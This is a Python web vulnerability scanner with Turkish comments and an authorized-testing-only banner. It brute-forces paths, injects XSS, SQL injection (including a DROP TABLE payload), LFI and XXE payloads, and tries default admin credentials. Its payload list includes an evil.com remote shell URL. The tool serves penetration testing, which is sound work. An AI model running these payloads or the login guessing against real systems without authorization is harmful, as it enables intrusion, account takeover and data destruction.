# DİREK BAŞLATMADAN ÖNCE 470. SATIRDA TARGET URL GİRİN



import requests
from bs4 import BeautifulSoup
import json
import time
import re
import ssl
import socket
from urllib.parse import urljoin, urlparse, parse_qs
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64
from datetime import datetime
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class AdvancedSecurityScanner:
    def __init__(self, target_url, delay=1, threads=10):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.delay = delay
        self.threads = threads
        self.session = requests.Session()
        self.vulnerabilities = []
        self.info_gathered = {}
        self.exploits_found = []
        
        self.setup_session()
        self.common_paths = [
            'admin', 'administrator', 'wp-admin', 'cpanel', 'phpmyadmin',
            'robots.txt', 'sitemap.xml', '.git', '.svn', 'backup',
            'config', 'database', 'db', 'api', 'v1', 'v2',
            'test', 'dev', 'staging', 'beta', '.env', 'config.php',
            'wp-config.php', 'configuration.php', 'settings.php',
            'install.php', 'setup.php', 'readme.txt', 'changelog.txt'
        ]
        
        self.payloads = {
            'xss': ['<script>alert("XSS")</script>', 'javascript:alert("XSS")', '"><script>alert("XSS")</script>'],
            'sqli': ["' OR '1'='1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"],
            'lfi': ['../../../../etc/passwd', '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '/etc/passwd'],
            'rfi': ['http://evil.com/shell.txt', 'https://pastebin.com/raw/malicious'],
            'xxe': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>']
        }

    def setup_session(self):
        # Session ayarları ve header'lar
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.session.verify = False  # SSL doğrulamasını devre dışı bırak

    def log_finding(self, category, severity, title, description, evidence=None):
        # Bulguları kaydet
        finding = {
            'timestamp': datetime.now().isoformat(),
            'category': category,
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'target': self.target_url
        }
        
        if category == 'vulnerability':
            self.vulnerabilities.append(finding)
        elif category == 'exploit':
            self.exploits_found.append(finding)
        else:
            if category not in self.info_gathered:
                self.info_gathered[category] = []
            self.info_gathered[category].append(finding)

    def banner_grab(self):
        # Server banner ve teknoloji bilgilerini topla
        try:
            response = self.session.head(self.target_url, timeout=10)
            
            # Server bilgileri
            server = response.headers.get('Server', 'Unknown')
            powered_by = response.headers.get('X-Powered-By', 'Unknown')
            
            self.log_finding('info', 'info', 'Server Information', 
                           f'Server: {server}, Powered by: {powered_by}',
                           str(dict(response.headers)))
            
            # Güvenlik header'larını kontrol et
            security_headers = [
                'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                'Strict-Transport-Security', 'Content-Security-Policy'
            ]
            
            missing_headers = [h for h in security_headers if h not in response.headers]
            if missing_headers:
                self.log_finding('vulnerability', 'medium', 'Missing Security Headers',
                               f'Missing headers: {", ".join(missing_headers)}')
            
        except Exception as e:
            self.log_finding('info', 'error', 'Banner Grab Failed', str(e))

    def ssl_scan(self):
        # SSL/TLS güvenlik kontrolü
        try:
            hostname = urlparse(self.target_url).netloc
            port = 443 if self.target_url.startswith('https') else 80
            
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((hostname, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        
                        self.log_finding('info', 'info', 'SSL Certificate Info',
                                       f'Subject: {cert.get("subject", "NA")}, '
                                       f'Issuer: {cert.get("issuer", "NA")}, '
                                       f'Version: {cert.get("version", "NA")}')
                        
                        # Zayıf cipher kontrolü
                        if cipher and ('RC4' in cipher[0] or 'DES' in cipher[0]):
                            self.log_finding('vulnerability', 'high', 'Weak SSL Cipher',
                                           f'Weak cipher detected: {cipher[0]}')
        except Exception as e:
            self.log_finding('info', 'error', 'SSL Scan Failed', str(e))

    def directory_bruteforce(self):
        # Dizin ve dosya keşfi
        found_paths = []
        
        def check_path(path):
            try:
                url = self.target_url + '/' + path
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    found_paths.append({
                        'path': path,
                        'status': response.status_code,
                        'size': len(response.content),
                        'url': url
                    })
                    
                    # Önemli dosyalar için özel kontroller
                    if path in ['robots.txt', '.env', 'config.php', 'wp-config.php']:
                        self.log_finding('vulnerability', 'medium', 'Sensitive File Exposed',
                                       f'Sensitive file found: {url}')
                        
                    if response.status_code == 200 and 'admin' in path.lower():
                        self.log_finding('vulnerability', 'medium', 'Admin Panel Found',
                                       f'Admin panel accessible: {url}')
                        
                time.sleep(self.delay)
            except:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_path, self.common_paths)
        
        if found_paths:
            self.log_finding('info', 'info', 'Directory Enumeration Results',
                           f'Found {len(found_paths)} accessible paths', str(found_paths))

    def sql_injection_test(self, url, params):
        # SQL Injection testi
        for param_name in params:
            for payload in self.payloads['sqli']:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # SQL hata mesajları kontrol et
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'Warning: mysql_', 'valid MySQL result', 'MySqlException',
                        'syntax error', 'MariaDB server version'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.log_finding('vulnerability', 'high', 'SQL Injection Detected',
                                           f'Parameter: {param_name}, Payload: {payload}, Error: {error}',
                                           response.text[:500])
                            return True
                            
                except Exception as e:
                    continue
        return False

    def xss_test(self, url, params):
        # Cross-Site Scripting testi
        for param_name in params:
            for payload in self.payloads['xss']:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    if payload in response.text:
                        self.log_finding('vulnerability', 'high', 'XSS Vulnerability Detected',
                                       f'Parameter: {param_name}, Payload: {payload}',
                                       response.text[:500])
                        return True
                        
                except Exception as e:
                    continue
        return False

    def lfi_test(self, url, params):
        # Local File Inclusion testi
        for param_name in params:
            for payload in self.payloads['lfi']:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Linux/Unix dosya içerikleri
                    if 'root:x:0' in response.text or 'daemon:x:1' in response.text:
                        self.log_finding('vulnerability', 'critical', 'Local File Inclusion',
                                       f'Parameter: {param_name}, File: {payload}',
                                       response.text[:500])
                        return True
                        
                    # Windows dosya içerikleri
                    if 'localhost' in response.text.lower() and 'Copyright (c) Microsoft Corp' in response.text:
                        self.log_finding('vulnerability', 'critical', 'Local File Inclusion',
                                       f'Parameter: {param_name}, File: {payload}',
                                       response.text[:500])
                        return True
                        
                except Exception as e:
                    continue
        return False

    def crawl_and_test(self):
        # Site içeriğini tara ve test et
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form'ları kontrol et
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                if action:
                    form_url = urljoin(self.target_url, action)
                else:
                    form_url = self.target_url
                
                # Form alanlarını topla
                inputs = form.find_all(['input', 'textarea', 'select'])
                params = {}
                
                for inp in inputs:
                    name = inp.get('name')
                    if name and inp.get('type') != 'submit':
                        params[name] = 'test'
                
                if params:
                    # Çeşitli saldırı testleri
                    self.sql_injection_test(form_url, params)
                    self.xss_test(form_url, params)
                    self.lfi_test(form_url, params)
            
            # URL parametrelerini kontrol et
            if '?' in self.target_url:
                parsed_url = urlparse(self.target_url)
                url_params = parse_qs(parsed_url.query)
                test_params = {k: v[0] if v else '' for k, v in url_params.items()}
                
                if test_params:
                    self.sql_injection_test(self.target_url, test_params)
                    self.xss_test(self.target_url, test_params)
                    self.lfi_test(self.target_url, test_params)
            
        except Exception as e:
            self.log_finding('info', 'error', 'Crawling Failed', str(e))

    def cms_detection(self):
        # CMS ve teknoloji tespiti
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # WordPress tespiti
            wp_indicators = [
                'wp-content', 'wp-includes', 'wp-json', 'wordpress'
            ]
            
            if any(indicator in response.text.lower() for indicator in wp_indicators):
                self.log_finding('info', 'info', 'WordPress Detected', 'WordPress CMS detected')
                
                # WordPress versiyonu
                version_match = re.search(r'wp-includes/js/wp-emoji-release.min.js\?ver=([\d.]+)', response.text)
                if version_match:
                    wp_version = version_match.group(1)
                    self.log_finding('info', 'info', 'WordPress Version', f'Version {wp_version}')
                    
                    # Eski versiyon kontrolü
                    if wp_version < '5.0':
                        self.log_finding('vulnerability', 'medium', 'Outdated WordPress',
                                       f'WordPress version {wp_version} is outdated')
                
                # wp-config.php kontrolü
                wp_config_response = self.session.get(f'{self.target_url}/wp-config.php', timeout=5)
                if wp_config_response.status_code == 200 and 'DB_PASSWORD' in wp_config_response.text:
                    self.log_finding('vulnerability', 'critical', 'WordPress Config Exposed',
                                   'wp-config.php file is accessible')
            
            # Joomla tespiti
            if 'joomla' in response.text.lower() or 'media/jui' in response.text:
                self.log_finding('info', 'info', 'Joomla Detected', 'Joomla CMS detected')
            
            # Drupal tespiti
            if 'drupal' in response.text.lower() or 'sites/default' in response.text:
                self.log_finding('info', 'info', 'Drupal Detected', 'Drupal CMS detected')
                
        except Exception as e:
            self.log_finding('info', 'error', 'CMS Detection Failed', str(e))

    def check_default_credentials(self):
        # Varsayılan kimlik bilgileri kontrolü
        default_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('root', 'root'), ('administrator', 'administrator'),
            ('admin', ''), ('root', 'toor'), ('admin', 'admin123')
        ]
        
        login_paths = ['admin', 'login', 'administrator', 'wp-admin', 'admin.php']
        
        for path in login_paths:
            login_url = self.target_url + '/' + path
            try:
                response = self.session.get(login_url, timeout=5)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Login formu bul
                    login_form = soup.find('form')
                    if login_form:
                        for username, password in default_creds:
                            # Basit login denemesi (dikkatli kullanın!)
                            login_data = {
                                'username': username,
                                'password': password,
                                'user': username,
                                'pass': password,
                                'login': 'Login'
                            }
                            
                            login_response = self.session.post(login_url, data=login_data, timeout=5)
                            
                            if 'dashboard' in login_response.text.lower() or 'welcome' in login_response.text.lower():
                                self.log_finding('exploit', 'critical', 'Default Credentials Work',
                                               f'Username: {username}, Password: {password} works on {login_url}')
                            
                            time.sleep(2)  # Rate limiting
                            
            except Exception as e:
                continue

    def run_full_scan(self):
        # Tam güvenlik taraması çalıştır
        print(f'[+] Starting security scan for {self.target_url}')
        print('[+] This tool is for authorized security testing only!')
        
        scan_functions = [
            ('Banner Grabbing', self.banner_grab),
            ('SSL/TLS Analysis', self.ssl_scan),
            ('Directory Enumeration', self.directory_bruteforce),
            ('CMS Detection', self.cms_detection),
            ('Web Application Testing', self.crawl_and_test),
            ('Default Credentials Check', self.check_default_credentials)
        ]
        
        for name, func in scan_functions:
            print(f'[+] Running {name}...')
            try:
                func()
            except Exception as e:
                print(f'[-] Error in {name}: {e}')
            time.sleep(1)
        
        return self.generate_report()

    def generate_report(self):
        # Detaylı rapor oluştur
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'low']),
                'exploits_found': len(self.exploits_found)
            },
            'vulnerabilities': self.vulnerabilities,
            'exploits': self.exploits_found,
            'information_gathered': self.info_gathered
        }
        
        return report

    def save_report(self, filename='security_scan_report.json'):
        # Raporu dosyaya kaydet
        report = self.generate_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f'[+] Report saved to {filename}')
        
        # Özet yazdır
        print('\n' + '='*50)
        print('SCAN SUMMARY')
        print('='*50)
        print(f'Target: {self.target_url}')
        print(f'Total Vulnerabilities: {report["summary"]["total_vulnerabilities"]}')
        print(f'Critical: {report["summary"]["critical"]}')
        print(f'High: {report["summary"]["high"]}')
        print(f'Medium: {report["summary"]["medium"]}')
        print(f'Exploits Found: {report["summary"]["exploits_found"]}')
        
        if self.vulnerabilities:
            print('\nVULNERABILITIES FOUND:')
            for vuln in self.vulnerabilities:
                print(f'[{vuln["severity"].upper()}] {vuln["title"]}')
        
        if self.exploits_found:
            print('\nEXPLOITS FOUND:')
            for exploit in self.exploits_found:
                print(f'[EXPLOIT] {exploit["title"]}: {exploit["description"]}')


def main():
    # Ana fonksiyon
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                Advanced Security Scanner                   ║
    ║                                                           ║
    ║  WARNING: This tool is for authorized testing only!       ║
    ║  Only use on systems you own or have permission to test.  ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Kullanım örneği
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    
    if not target:
        target = 'https://10.0.2.15'  # URL GİRİNİZ.
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    scanner = AdvancedSecurityScanner(target, delay=1, threads=5)
    
    try:
        report = scanner.run_full_scan()
        scanner.save_report(f'scan_{urlparse(target).netloc}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        
    except KeyboardInterrupt:
        print('\n[-] Scan interrupted by user')
    except Exception as e:
        print(f'[-] Scan failed: {e}')


if __name__ == '__main__':
    main()
